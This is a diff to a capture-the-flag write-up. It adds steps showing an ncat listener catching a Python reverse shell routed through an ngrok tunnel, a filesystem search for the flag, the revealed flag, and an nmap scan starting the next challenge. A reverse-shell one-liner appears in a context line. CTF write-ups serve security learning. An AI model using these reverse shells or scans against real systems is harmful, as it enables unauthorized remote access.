@@ -139,6 +139,9 @@ PING 2.tcp.eu.ngrok.io (3.126.37.18) 56(84) bytes of data.
 rtt min/avg/max/mdev = 145.905/152.805/159.706/6.900 ms
 
 ```
+ncat listener ready
+
+![image](https://user-images.githubusercontent.com/87468669/194132884-d3427e33-34de-4291-a5fc-5ecdbc8c12a7.png)
 
 reverse shell payload 
 ```
@@ -147,9 +150,47 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![image](https://user-images.githubusercontent.com/87468669/194127758-cb433e30-7425-45a6-8d5d-f8cac0fd0ca2.png)
 
+Checking our ncat listener, Boom! we got a shell 😅
+
 ![image](https://user-images.githubusercontent.com/87468669/194127891-58614c0b-9f2b-4c9c-883a-99f5e08fa298.png)
 
+Now hunting for the flag, i did ```find / 2>/dev/null | grep -i "flag"```
+
+![image](https://user-images.githubusercontent.com/87468669/194134825-2b1842db-c10c-41b2-a779-a2ebcb09da87.png)
+
+![image](https://user-images.githubusercontent.com/87468669/194135145-6a7f239b-d41e-43b6-9782-be818e78c9f1.png)
+
+
 ![image](https://user-images.githubusercontent.com/87468669/194128264-0d992453-8661-4122-8e9c-810eaa49994f.png)
+
+final flag - abcctf{345Y_r007_W17H_D3F4U17_Cr3D5}
+
+sweet challeng from Muzec.
+
+### Pain - 1500pts
+
+![image](https://user-images.githubusercontent.com/87468669/194135616-d4c951a1-204b-42e9-a84a-656671c6c53f.png)
+
+We got 2 IPs and ports again this really will be Pain 💉💉💉. Regardless we move. As we can see the first IP is an http server, let's use nmap to check and know what service is running on that port 2222.
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Pain]
+└─$ nmap -sC -sV  185.203.119.220 -p 2222  
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 13:38 CDT
+Nmap scan report for 185.203.119.220
+Host is up (0.67s latency).
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f3:c8:21:9a:27:8e:62:7c:be:5c:31:0b:d8:bf:46:86 (ECDSA)
+|_  256 45:74:d1:d7:94:a7:a6:b3:12:4b:91:7f:6e:a5:e0:4a (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
+```
+
 
 
 
